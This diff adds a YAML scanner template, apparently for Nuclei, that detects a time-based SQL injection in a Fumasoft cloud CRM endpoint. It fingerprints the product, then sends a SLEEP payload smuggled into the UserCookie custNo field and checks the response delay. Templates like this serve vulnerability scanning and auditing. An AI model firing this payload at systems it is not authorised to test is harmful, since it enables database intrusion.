@@ -1,0 +1,48 @@
+id: fumasoft-ajaxbusinesspriceactivereports-sqli
+info:
+  name: Fumasoft AjaxBusinessPriceActiveReports SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Fumasoft AjaxBusinessPriceActiveReports endpoint.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "孚盟云"
+
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: UserCookie={"custNo":"1') AND (SELECT 4920 FROM (SELECT(SLEEP({{t1}})))ILaK)-- -"}
+
+        action=GetTempelateList
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "TempelateId"
+          - "TempelateName"
+      - type: word
+        negative: true
+        words:
+          - "<"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
